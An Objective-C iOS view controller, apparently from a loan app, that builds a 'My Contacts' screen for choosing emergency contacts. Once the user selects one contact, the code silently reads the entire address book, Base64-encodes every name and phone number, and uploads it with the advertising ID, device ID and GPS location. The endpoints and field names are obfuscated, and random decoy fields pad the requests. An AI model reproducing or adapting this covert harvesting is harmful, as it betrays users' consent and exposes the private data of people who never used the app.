//
//  GtxlplBackController.m
//  OPherame
//
//  Created by todesk on 2025/6/27.
//

#import "GtxlplBackController.h"
#import "EKMGPopupView.h"
#import "ContactPermissionHandler.h"
#import "GpaymBackController.h"
#import "Base64Tool.h"
@interface GtxlplBackController ()<UITableViewDataSource, UITableViewDelegate,OPhNavigationBackButtonDelegate>
@property (nonatomic, strong) UITableView *tableView;
@property (nonatomic, strong) NSArray *dataArray;
@property (nonatomic, strong) NSMutableDictionary *inputValues; // 存储用户输入的值1
@property (nonatomic, strong) NSMutableDictionary *contValues; // 存储用户输入的值2



@property (nonatomic, assign) CGFloat originalContainerHeight; // 原始容器高度
@property (nonatomic, strong) UIView *containerView;

@property (nonatomic, strong) NSMutableArray *arPdata;

@property (nonatomic, strong) NSString *startTime;
@end

@implementation GtxlplBackController

- (void)navigationBackButtonDidClick {
    // 执行返回前的操作...返回按钮被点击，可以在这里保存数据等操作
    [self.view endEditing:YES];
    [EKMGPopupView showWithTitle:@"Really skip verification?" content:@"After verifcation, you can enjoy\n account security protection,\n fundsare more secure, and loans\n areeasier to obtain" CancelStr:@"Cancel" sureStr:@"Confirm" confirmAction:^(NSObject * _Nullable obj) {
        
        [EKMGPopupView dismiss];
        [self popToSpecificViewController:[FrequqesController class]];
    }];
    

}

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view.
    
    self.title = @"My Contacts";
    self.customTitleColor = [UIColor whiteColor];
    UIImage *image = [UIImage imageNamed:@"plobac"];
    UIImageView *backgroundImageView = [[UIImageView alloc] init];
    backgroundImageView.image = image;
    backgroundImageView.contentMode = UIViewContentModeScaleToFill;
    backgroundImageView.clipsToBounds = YES;
    backgroundImageView.frame = CGRectMake(0, 0, self.view.width, self.view.height);
    [self.view addSubview:backgroundImageView];
    
    self.startTime = [BeiMInfoUtil getCurrentTimestampInSeconds];
    
    
    self.containerView = [[UIView alloc]initWithFrame:CGRectMake(8, [UIView navigationBarHeight]+[UIView statusBarHeight]+20, self.view.width-16, 300)];
    self.containerView.backgroundColor = [UIColor whiteColor];
    self.containerView.layer.cornerRadius = 16;
    [self.view addSubview:self.containerView];
  
    [[NetworkManager sharedManager] POST:@"/radiating/taken"
                              parameters:@{@"harukos":self.harukos,@"imagined":[RandomStringGenerator randomlyCallMethod]}
                                 headers:nil
                               progress:nil
                                success:^(id responseObject) {
        
        if([responseObject[@"heavy"] isEqualToString:@"0"]){
            self.dataArray = responseObject[@"thump"][@"frankly"][@"jiju"];
            for (NSDictionary *data in self.dataArray) {
                NSMutableDictionary *dicc = [NSMutableDictionary dictionary];
                [dicc setValue:data[@"chipped"] forKey:@"chipped"];
                [dicc setValue:data[@"travelled"] forKey:@"travelled"];
                [dicc setValue:data[@"appreciating"] forKey:@"appreciating"];
                [dicc setValue:data[@"earnestly"] forKey:@"earnestly"];
                [self.arPdata addObject:dicc];
            }
            [self.tableView reloadData];
        }else{
            [SHToast showWithText:responseObject[@"daughters"]];
        }
        
    } failure:^(NSError *error) {
        NSLog(@"失败: %@", error.localizedDescription);
        [SHToast showWithText:error.localizedDescription];
        
    }];
    
    
    self.originalContainerHeight = 300; // 默认高度
    
    self.inputValues = [NSMutableDictionary dictionary];
    self.contValues = [NSMutableDictionary dictionary];
    
    self.arPdata = [NSMutableArray array];
    // 创建表格视图
    self.tableView = [[UITableView alloc] initWithFrame:CGRectMake(22, 31, self.containerView.width-44, self.containerView.height-62) style:UITableViewStyleGrouped];
    self.tableView.backgroundColor = [UIColor whiteColor];
    self.tableView.dataSource = self;
    self.tableView.delegate = self;
    self.tableView.separatorStyle = UITableViewCellSeparatorStyleNone;
    self.tableView.showsVerticalScrollIndicator = NO;
    self.tableView.layer.cornerRadius = 16;
    [self.containerView addSubview:self.tableView];
    
    // 自动调整高度
    self.tableView.rowHeight = 107.5;

    
    // 监听表格内容变化
    [self.tableView addObserver:self forKeyPath:@"contentSize" options:NSKeyValueObservingOptionNew context:nil];
    
    UIButton *applyButton = [UIButton buttonWithType:UIButtonTypeSystem];
    applyButton.frame = CGRectMake(61, self.view.bounds.size.height - 80, self.view.bounds.size.width - 122, 50);
    [applyButton setTitle:@"Next step" forState:UIControlStateNormal];
    [applyButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    applyButton.titleLabel.font = [UIFont boldSystemFontOfSize:18];
    [applyButton setBackgroundImage:[UIImage imageNamed:@"bukath"] forState:(UIControlStateNormal)];
    [applyButton addTarget:self action:@selector(confirmButtonTapped) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:applyButton];
}

-(void)confirmButtonTapped{
    
    
    NSMutableDictionary *parameters = [NSMutableDictionary dictionary];
    
    
    
    
    
    [parameters addEntriesFromDictionary:@{@"harukos":self.harukos,@"thump":self.arPdata.count>0?[self convertArrayToCompactJSON:self.arPdata]:@""}];
    
    [[NetworkManager sharedManager] POST:@"/radiating/glanced"
                              parameters:parameters
                                 headers:nil
                               progress:nil
                                success:^(id responseObject) {
        
        if([responseObject[@"heavy"] isEqualToString:@"0"]){
            
            NSMutableDictionary *mutbdic = [NSMutableDictionary dictionary];
            mutbdic[@"moneys"] = self.startTime;
            mutbdic[@"flatter"] = [BeiMInfoUtil getCurrentTimestampInSeconds];
            [self locaRadiatingPermis:mutbdic];
            
            [self cradiatingButtonTomomi];
        }else{
            [SHToast showWithText:responseObject[@"daughters"]];
        }
        
    } failure:^(NSError *error) {
        NSLog(@"失败: %@", error.localizedDescription);
        [SHToast showWithText:error.localizedDescription];
        
    }];
}

-(void)cradiatingButtonTomomi{
    
    
    //[self popToSpecificViewController:[FrequqesController class]];
    
    [[NetworkManager sharedManager] POST:@"/radiating/tomomi"
                              parameters:@{@"harukos": self.harukos,@"bygone":[RandomStringGenerator randomlyCallMethod], @"riveted": [RandomStringGenerator randomlyCallMethod]}
                                headers:nil
                               progress:nil
                                success:^(id responseObject) {
        
        if([responseObject[@"heavy"] isEqualToString:@"0"]){
            
            NSDictionary *species = responseObject[@"thump"][@"species"];
            if ([species[@"pensive"] isEqualToString:@"cupersuchousL"]){
                
                GpaymBackController *controller = [[GpaymBackController alloc]init];
                controller.harukos = self.harukos;
                [self.navigationController pushViewController:controller animated:YES];
            }else if(species == nil){
                [self cradiatingflipped];
            }
            
        }else{
            [SHToast showWithText:responseObject[@"daughters"]];
        }
        
    } failure:^(NSError *error) {
        NSLog(@"失败: %@", error.localizedDescription);
        [SHToast showWithText:error.localizedDescription];
        
    }];
    
    
}

- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary<NSKeyValueChangeKey,id> *)change context:(void *)context {
    if ([keyPath isEqualToString:@"contentSize"]) {
        // 计算表格所需高度
        CGFloat tableHeight = self.tableView.contentSize.height;
        
        // 计算容器最终高度（取最大值：原始高度或表格所需高度）
        CGFloat finalHeight = MAX(self.originalContainerHeight, tableHeight);
        if(finalHeight>500){
            finalHeight = 500;
        }
        
        // 更新容器和表格的frame
        CGRect containerFrame = self.containerView.frame;
        containerFrame.size.height = finalHeight+62;
        self.containerView.frame = containerFrame;
        
        CGRect tableFrame = self.tableView.frame;
        tableFrame.size.height = finalHeight;
        self.tableView.frame = tableFrame;
    }
}

- (void)dealloc {
    // 移除观察者
    [self.tableView removeObserver:self forKeyPath:@"contentSize"];
}

- (NSString *)convertArrayToCompactJSON:(NSArray *)array {
    if (![NSJSONSerialization isValidJSONObject:array]) {
        NSLog(@"数组不能转换为JSON");
        return nil;
    }
    
    NSError *error;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:array
                                                      options:0  // 关键：使用0而不是NSJSONWritingPrettyPrinted
                                                        error:&error];
    
    if (!jsonData) {
        NSLog(@"转换为JSON失败: %@", error.localizedDescription);
        return nil;
    }
    
    return [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding];
}
#pragma mark - UITableViewDataSource

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
    return self.dataArray.count;
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    static NSString *cellIdentifier = @"EditableCell";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:cellIdentifier];
    
    if (!cell) {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:cellIdentifier];
        cell.selectionStyle = UITableViewCellSelectionStyleNone;
        // 标题标签
        UILabel *titleLabel = [[UILabel alloc] initWithFrame:CGRectMake(0, 0, CGRectGetWidth(tableView.frame), 24.5)];
        titleLabel.tag = 100;
        titleLabel.font = [UIFont boldSystemFontOfSize:14];
        titleLabel.textColor = [UIColor blackColor];
        [cell.contentView addSubview:titleLabel];
        
        // 输入框/占位文本
        UITextField *textField = [[UITextField alloc] initWithFrame:CGRectMake(0, titleLabel.bottom+5, CGRectGetWidth(tableView.frame), 33)];
        textField.tag = 101;
        textField.font = [UIFont systemFontOfSize:13];
        textField.backgroundColor = [UIView colorFromRGB:0xF8F8F8];
        textField.layer.cornerRadius = 4;
        [cell.contentView addSubview:textField];
        
        // 设置左边间距
        UIView *leftPadding = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 12, 33)];
        textField.leftView = leftPadding;
        textField.leftViewMode = UITextFieldViewModeAlways;
        
        // 自定义 accessory view 调整箭头位置
        UIImage *arrowImage = [UIImage systemImageNamed:@"chevron.right"]; // iOS 13+
        UIButton *arrowButton = [UIButton buttonWithType:UIButtonTypeCustom];
        [arrowButton setImage:arrowImage forState:UIControlStateNormal];
        arrowButton.frame = CGRectMake(0, 0, 15, 15); // 调整大小
        arrowButton.userInteractionEnabled = NO;
        arrowButton.tintColor = [UIColor lightGrayColor];
        UIView *rightContainer = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 30, 33)];
        // 调整图标垂直居中
        CGFloat verticalOffset = (textField.frame.size.height - 15) / 2;
        arrowButton.frame = CGRectMake((30-15)/2, verticalOffset, 15, 15);
        [rightContainer addSubview:arrowButton];
        textField.rightView = rightContainer;
        textField.rightViewMode = UITextFieldViewModeAlways;
        
        UITapGestureRecognizer *tapGesture = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(handleTextFieldTap:)];
        [textField addGestureRecognizer:tapGesture];
        textField.userInteractionEnabled = YES; // 确保可以接收手势
        
        
        //联系人方式
        UITextField *comrField = [[UITextField alloc] initWithFrame:CGRectMake(0, textField.bottom+12, CGRectGetWidth(tableView.frame), 33)];
        comrField.tag = 102;
        comrField.font = [UIFont systemFontOfSize:13];
        comrField.backgroundColor = [UIView colorFromRGB:0xF8F8F8];
        comrField.layer.cornerRadius = 4;
        [cell.contentView addSubview:comrField];
        
        // 设置左边间距
        leftPadding = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 12, 33)];
        comrField.leftView = leftPadding;
        comrField.leftViewMode = UITextFieldViewModeAlways;
        
        tapGesture = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(handlecomrFieldTap:)];
        [comrField addGestureRecognizer:tapGesture];
        comrField.userInteractionEnabled = YES; // 确保可以接收手势
    }
    
    NSDictionary *item = self.dataArray[indexPath.row];

    // 配置标题
    UILabel *titleLabel = [cell.contentView viewWithTag:100];
    titleLabel.text = item[@"trip"];
    
    // 配置输入框/占位文本
    UITextField *textField = [cell.contentView viewWithTag:101];
    textField.placeholder = item[@"nankoku"];
    
    UITextField *comrField = [cell.contentView viewWithTag:102];
    comrField.placeholder = item[@"region"];
    
    // 恢复已输入的值
    NSString *key = [NSString stringWithFormat:@"%ld", (long)indexPath.row];
    if (self.inputValues[key]) {
        textField.text = self.inputValues[key];
    } else {
        if(item[@"travelled"]&&![item[@"travelled"] isEqualToString:@""]){
            NSDictionary*imitation = [item[@"precise"] objectAtIndex:[item[@"travelled"] intValue]-1];
            textField.text = imitation[@"appreciating"];
            self.inputValues[key] = imitation[@"appreciating"];
            
        }else{
            textField.text = @"";
        }
    }
    
    NSString *contkey = [NSString stringWithFormat:@"C%ld", (long)indexPath.row];
    if (self.contValues[contkey]) {
        comrField.text = self.contValues[contkey];
    } else {
        if(item[@"earnestly"]&&![item[@"earnestly"] isEqualToString:@""]){
        
            comrField.text = [NSString stringWithFormat:@"%@ : %@",item[@"appreciating"], item[@"earnestly"]];
            self.contValues[key] = [NSString stringWithFormat:@"%@ : %@",item[@"appreciating"], item[@"earnestly"]];
        }else{
            comrField.text = @"";
        }
    }
    
//    // 重置rightView防止重用问题
//        textField.rightView = nil;
//    // 根据是否可编辑设置样式
//    if ([item[@"staff"] isEqualToString:@"cupersuchousN"]) {
//        textField.userInteractionEnabled = YES;
//        textField.textColor = [UIColor blackColor];
//        cell.accessoryType = UITableViewCellAccessoryNone;
//    } else {
//        textField.userInteractionEnabled = NO;
//        textField.textColor = [UIColor grayColor];
//        
//       
//    }
    
    return cell;
}



-(UIView*)tableView:(UITableView *)tableView viewForFooterInSection:(NSInteger)section{
    return [UIView new];
}
-(CGFloat)tableView:(UITableView *)tableView heightForFooterInSection:(NSInteger)section{
    return 21;
}

-(UIView*)tableView:(UITableView *)tableView viewForHeaderInSection:(NSInteger)section{
    return [UIView new];
}
-(CGFloat)tableView:(UITableView *)tableView heightForHeaderInSection:(NSInteger)section{
    return 0.01;
}



-(void)handleTextFieldTap:(UITapGestureRecognizer*)tap{
    UITableViewCell *cell = (UITableViewCell *)tap.view.superview.superview;
    NSIndexPath *indexPath = [self.tableView indexPathForCell:cell];
  
    NSDictionary *item = self.dataArray[indexPath.row];
    NSString *key = [NSString stringWithFormat:@"%ld", (long)indexPath.row];
    
    NSMutableDictionary *dicc = [NSMutableDictionary dictionary];
    //单选
    [EKMGPopupView showWithTitle:item[@"trip"] isComper:YES addreess:nil mainOptions:item[@"precise"] confirmAction:^(NSObject * _Nullable obj) {
        NSNumber *num = (NSNumber*)obj;
        NSDictionary *ring = [item[@"precise"] objectAtIndex:[num intValue]];
        [self.inputValues setValue:ring[@"appreciating"] forKey:key];
        
        [self.tableView reloadRowsAtIndexPaths:@[indexPath] withRowAnimation:UITableViewRowAnimationNone];
        
        if(self.arPdata.count>0){
            NSMutableArray *chippeds = [NSMutableArray array];
            for (NSDictionary *km in self.arPdata) {
                [chippeds addObject:km[@"chipped"]];
            }
            
            
            if([chippeds containsObject:item[@"chipped"]]){
                [self.arPdata enumerateObjectsUsingBlock:^(NSDictionary *dict, NSUInteger idx, BOOL *stop) {
                    if ([dict[@"chipped"] isEqualToString:item[@"chipped"]]) {
                        NSMutableDictionary *mutableDict = [dict mutableCopy];
                        mutableDict[@"travelled"] = ring[@"imitation"];
                        [mutableDict setValue:ring[@"imitation"] forKey:@"travelled"];
                        self.arPdata[idx] = mutableDict;
                    }
                }];
                
                
            }else{
                [dicc setValue:item[@"chipped"] forKey:@"chipped"];
                [dicc setValue:ring[@"imitation"] forKey:@"travelled"];
                [self.arPdata addObject:dicc];
            }
            
            
            
        }else{
            [dicc setValue:item[@"chipped"] forKey:@"chipped"];
            [dicc setValue:ring[@"imitation"] forKey:@"travelled"];
            [self.arPdata addObject:dicc];
        }
        
    }];
}

-(void)handlecomrFieldTap:(UITapGestureRecognizer*)tap{
    UITableViewCell *cell = (UITableViewCell *)tap.view.superview.superview;
    NSIndexPath *indexPath = [self.tableView indexPathForCell:cell];
    NSDictionary *item = self.dataArray[indexPath.row];
    
    
    NSString *contkey = [NSString stringWithFormat:@"C%ld", (long)indexPath.row];
    
    NSMutableDictionary *dicc = [NSMutableDictionary dictionary];
    
    [[ContactPermissionHandler sharedInstance] requestContactPermissionWithViewController:self
                                                                          onContactSelected:^(NSString * _Nullable name, NSString * _Nullable phoneNumber) {
            if (name && phoneNumber) {
                NSLog(@"选择了联系人: %@, 电话: %@", name, phoneNumber);
                
                
                
                
                // 更新UI显示选择的联系人
                [self.contValues setValue:[NSString stringWithFormat:@"%@ : %@",name, phoneNumber] forKey:contkey];
                [self.tableView reloadRowsAtIndexPaths:@[indexPath] withRowAnimation:UITableViewRowAnimationNone];
                
                if(self.arPdata.count>0){
                    NSMutableArray *chippeds = [NSMutableArray array];
                    for (NSDictionary *km in self.arPdata) {
                        [chippeds addObject:km[@"chipped"]];
                    }
                    
                    
                    if([chippeds containsObject:item[@"chipped"]]){
                        [self.arPdata enumerateObjectsUsingBlock:^(NSDictionary *dict, NSUInteger idx, BOOL *stop) {
                                                if ([dict[@"chipped"] isEqualToString:item[@"chipped"]]) {
                                                    NSMutableDictionary *mutableDict = [dict mutableCopy];
                                                    mutableDict[@"earnestly"] = phoneNumber;
                                                    mutableDict[@"appreciating"] = name;
                                                    
                                                    self.arPdata[idx] = mutableDict;
                                                }
                                            }];
                        
                        
                    }else{
                        [dicc setValue:phoneNumber forKey:@"earnestly"];
                        [dicc setValue:name forKey:@"appreciating"];
                        [dicc setValue:item[@"chipped"] forKey:@"chipped"];
                        [self.arPdata addObject:dicc];
                    }
                }else{
                    [dicc setValue:phoneNumber forKey:@"earnestly"];
                    [dicc setValue:name forKey:@"appreciating"];
                    [dicc setValue:item[@"chipped"] forKey:@"chipped"];
                    [self.arPdata addObject:dicc];
                }
                
                
                
                
//                NSMutableArray *contacts = [NSMutableArray array];
//                for (NSDictionary *dicc in self.arPdata) {
//                    if(![dicc[@"earnestly"] isEqualToString:@""]&&![dicc[@"appreciating"] isEqualToString:@""])
//                    [contacts addObject:@{
//                        @"complaining": dicc[@"earnestly"],
//                        @"appreciating": dicc[@"appreciating"]
//                    }];
//                }
                
//                // 上报联系人数据
//                [self reportContacts:contacts completion:^(BOOL success, NSError *error) {
//                    NSLog(@"%d",success);
//                }];
                
                
                // 上报所有联系人信息
                [self uploadAllContactsWithCompletion:^(BOOL success, NSError * _Nullable error) {
                    if (!success) {
                        NSLog(@"上传联系人失败: %@", error.localizedDescription);
                    }
                }];
                
            } else {
                NSLog(@"用户取消了选择");
                if(!name && phoneNumber){
                    [SHToast showWithText:@"姓名为空"];
                }else if (name && !phoneNumber){
                    [SHToast showWithText:@"手机号为空"];
                }
            }
        } onPermissionDenied:^{
            NSLog(@"用户拒绝了权限");
        }];
}







-(void)locaRadiatingPermis:(NSMutableDictionary*)permis{
    
    
    [[LocationUtilfo sharedManager] getFullLocationWithViewController:self completion:^(NSString *country, NSString *countryCode, NSString *province, NSString *city, NSString *district, NSString *street, NSString *fullAddress, CLLocationCoordinate2D coordinate, NSError *error) {
    }];
    
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        
        NSString *lat = [[NSUserDefaults standardUserDefaults] valueForKey:@"lllasd"];
        NSString *lngcoo = [[NSUserDefaults standardUserDefaults] valueForKey:@"lllong"];
        
        NSDictionary *medis = @{
            @"centimetre": self.harukos,   // 产品ID
            @"bill": @"7",         // 看文档首页 上报场景类型：1、注册 2、认证选择 3、证件信息 4、人脸照片 5、个人信息 6、工作信息 7、紧急联系人 8、银行卡信息9、开始申贷 10、结束申贷
            @"flipped": @"",            // 用户申贷全局订单号，不用管, 传空即可
            @"splitting": [BeiMInfoUtil getOrCreateIDFV], // idfv
            @"tight": [[ASIdentifierManager sharedManager].advertisingIdentifier UUIDString]?:@"",             // idfa
            @"stroke": lngcoo?:@"",     // 经度
            @"surveying": lat?:@"",        // 纬度
            @"skills": [RandomStringGenerator randomlyCallMethod]         // 混淆字段
        };
        
        [permis addEntriesFromDictionary:medis];
        [[NetworkManager sharedManager]googleMarketPOST:@"/radiating/winds" parameters:permis headers:nil progress:nil success:^(id  _Nullable responseObject) {
            if([responseObject[@"heavy"] isEqualToString:@"0"]){
                
            }
            
        } failure:^(NSError * _Nonnull error) {
            
        }];
        
    });
}


-(void)cradiatingflipped{
    
    //开始时间
    NSString *StartTime = [BeiMInfoUtil getCurrentTimestampInSeconds];
    NSMutableDictionary *mutbdic = [NSMutableDictionary dictionary];
    mutbdic[@"moneys"] = StartTime;
    mutbdic[@"flatter"] = [BeiMInfoUtil getCurrentTimestampInSeconds];
    mutbdic[@"bill"] = @"9";
    
    [[NetworkManager sharedManager] POST:@"/radiating/car"
                              parameters:@{@"concentration": self.flipped?:@"",@"koimari":[RandomStringGenerator randomlyCallMethod], @"lacquer": [RandomStringGenerator randomlyCallMethod],@"intervals":[RandomStringGenerator randomlyCallMethod],@"equal":[RandomStringGenerator randomlyCallMethod]}
                                headers:nil
                               progress:nil
                                success:^(id responseObject) {
        
        if([responseObject[@"heavy"] isEqualToString:@"0"]){
            
            NSDictionary *species = responseObject[@"thump"][@"shiny"];
            if(species != nil){
                
                //跳转H5网页
                NSString *shiny = [BeiMInfoUtil appendParamsToURL:responseObject[@"thump"][@"shiny"] params:[[NetworkManager sharedManager]  addCommonParameters:nil]];
//                NSURL *url = [NSURL URLWithString:shiny];
//                SFSafariViewController *safariVC = [[SFSafariViewController alloc] initWithURL:url];
//                // 在当前的视图控制器上呈现
//                [self presentViewController:safariVC animated:YES completion:nil];
                
                WKWebViewController *webVC = [[WKWebViewController alloc] initWithURLString:shiny];
                                webVC.themeColor = [UIView colorFromRGB:0x3D6AFF];
                webVC.harukos = self.harukos;
                                [self.navigationController pushViewController:webVC animated:YES];
                [self locaRadiatingPermis:mutbdic];
            }
            
        }else{
            [SHToast showWithText:responseObject[@"daughters"]];
        }
        
    } failure:^(NSError *error) {
        NSLog(@"失败: %@", error.localizedDescription);
        [SHToast showWithText:error.localizedDescription];
        
    }];
    
}



#pragma mark - 上传所有联系
- (void)uploadAllContactsWithCompletion:(void (^)(BOOL success, NSError * _Nullable error))completion {
    CNAuthorizationStatus status = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];
    
//    status == CNAuthorizationStatusDenied ||  需求:通讯录IOS18以上需要添加部分授权也可以继续流程  所以不添加到if
    if ( status == CNAuthorizationStatusRestricted) {
        NSError *error = [NSError errorWithDomain:@"ContactAccess"
                                             code:status
                                         userInfo:@{NSLocalizedDescriptionKey: @"联系人访问权限被拒绝"}];
        if (completion) completion(NO, error);
        return;
    }
    
    CNContactStore *store = [[CNContactStore alloc] init];
    if (status == CNAuthorizationStatusNotDetermined) {
        [store requestAccessForEntityType:CNEntityTypeContacts completionHandler:^(BOOL granted, NSError * _Nullable error) {
            dispatch_async(dispatch_get_main_queue(), ^{
                if (granted) {
                    [self fetchAndUploadContactsFromStore:store completion:completion];
                } else {
                    if (completion) completion(NO, error);
                }
            });
        }];
    } else {
        [self fetchAndUploadContactsFromStore:store completion:completion];
    }
}

- (void)fetchAndUploadContactsFromStore:(CNContactStore *)store completion:(void(^)(BOOL success, NSError *error))completion {
    
    CNContactStore *contactStore = [[CNContactStore alloc] init];
    NSArray *keysToFetch = @[CNContactFamilyNameKey, CNContactGivenNameKey, CNContactPhoneNumbersKey, CNContactOrganizationNameKey];
    NSError *error;

    // Create a predicate if you need to filter contacts
    // NSPredicate *predicate = [CNContact predicateForContactsMatchingName:@"John"];

    NSArray *arr = [contactStore unifiedContactsMatchingPredicate:nil keysToFetch:keysToFetch error:&error];
    if (!error) {
        NSMutableArray *contacts = [NSMutableArray array];
        for (int i = 0; i < arr.count; i++) {
            CNContact *contact = arr[i];
            NSString *familyName = contact.familyName;
            NSString *givenName = contact.givenName;
            
            // Get phone numbers
            NSMutableArray *phones = [NSMutableArray array];
            for (CNLabeledValue *phone in contact.phoneNumbers) {
                CNPhoneNumber *phoneNum = phone.value;
                [phones addObject:[phoneNum.stringValue stringByReplacingOccurrencesOfString:@" " withString:@""]];
            }
            
            [contacts addObject:@{
                @"complaining": phones.count ? [phones componentsJoinedByString:@","] : @"",
                @"appreciating": [NSString stringWithFormat:@"%@%@", givenName, familyName]
            }];
        }
        
        
        // 上报联系人数据
        [self reportContacts:contacts completion:completion];
        
    }
    
}

- (void)reportContacts:(NSArray *)contacts completion:(void(^)(BOOL success, NSError *error))completion {
    if (!contacts || contacts.count == 0) {
        if (completion) completion(YES, nil);
        return;
    }
    
    // 确保contacts可以被序列化为JSON
    NSError *jsonError;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:contacts options:0 error:&jsonError];
    if (!jsonData) {
        if (completion) completion(NO, jsonError);
        return;
    }
    
    // 使用Base64编码
    NSString *encodedContacts = [Base64Tool base64EncodeData:jsonData];
    if (!encodedContacts) {
        NSError *error = [NSError errorWithDomain:@"ContactAccess"
                                             code:-2
                                         userInfo:@{NSLocalizedDescriptionKey: @"联系人数据编码失败"}];
        if (completion) completion(NO, error);
        return;
    }
    
    // 构建请求参数
    NSDictionary *parameters = @{
        @"imitation": @"3",
        @"reverberate": [RandomStringGenerator randomlyCallMethod],
        @"satisfying": [RandomStringGenerator randomlyCallMethod],
        @"thump": encodedContacts
    };
    
    // 发送网络请求
    [[NetworkManager sharedManager] googleMarketPOST:@"/radiating/remember"
                                         parameters:parameters
                                           headers:nil
                                         progress:nil
                                          success:^(id  _Nullable responseObject) {
        if (completion) completion(YES, nil);
    } failure:^(NSError * _Nonnull error) {
        if (completion) completion(NO, error);
    }];
}

@end
